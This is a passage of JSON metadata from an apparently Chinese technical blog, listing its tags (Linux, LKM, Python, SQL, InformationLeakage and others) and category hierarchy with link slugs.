可以支持具有不同速率的端口的交换","link":"/network-network4/"}],"tags":[{"name":"Linux","slug":"Linux","link":"/tags/Linux/"},{"name":"LKM","slug":"LKM","link":"/tags/LKM/"},{"name":"Python","slug":"Python","link":"/tags/Python/"},{"name":"C","slug":"C","link":"/tags/C/"},{"name":"Computer Organization Principles","slug":"Computer-Organization-Principles","link":"/tags/Computer-Organization-Principles/"},{"name":"DataStructure","slug":"DataStructure","link":"/tags/DataStructure/"},{"name":"WEB","slug":"WEB","link":"/tags/WEB/"},{"name":"ClientIP","slug":"ClientIP","link":"/tags/ClientIP/"},{"name":"Kivy","slug":"Kivy","link":"/tags/Kivy/"},{"name":"App","slug":"App","link":"/tags/App/"},{"name":"InformationLeakage","slug":"InformationLeakage","link":"/tags/InformationLeakage/"},{"name":"NetWork","slug":"NetWork","link":"/tags/NetWork/"},{"name":"Windows","slug":"Windows","link":"/tags/Windows/"},{"name":"PE","slug":"PE","link":"/tags/PE/"},{"name":"SQL","slug":"SQL","link":"/tags/SQL/"}],"categories":[{"name":"Firewall","slug":"Firewall","link":"/categories/Firewall/"},{"name":"Note","slug":"Note","link":"/categories/Note/"},{"name":"WEB","slug":"Note/WEB","link":"/categories/Note/WEB/"},{"name":"Computer Organization Principles","slug":"Note/Computer-Organization-Principles","link":"/categories/Note/Computer-Organization-Principles/"},{"name":"Application","slug":"Application","link":"/categories/Application/"},{"name":"DataStructure","slug":"Note/DataStructure","link":"/categories/Note/DataStructure/"},{"name":"NetWork","slug":"Note/NetWork","link":"/categories/Note/NetWork/"},{"name":"Kivy","slug":"Application/Kivy","link":"/categories/Application/Kivy/"},{"name":"PE","slug":"Note/PE","link":"/categories/Note/PE/"},{"name":"SQL","slug":"Note/SQL","link":"/categories/Note/SQL/"}]}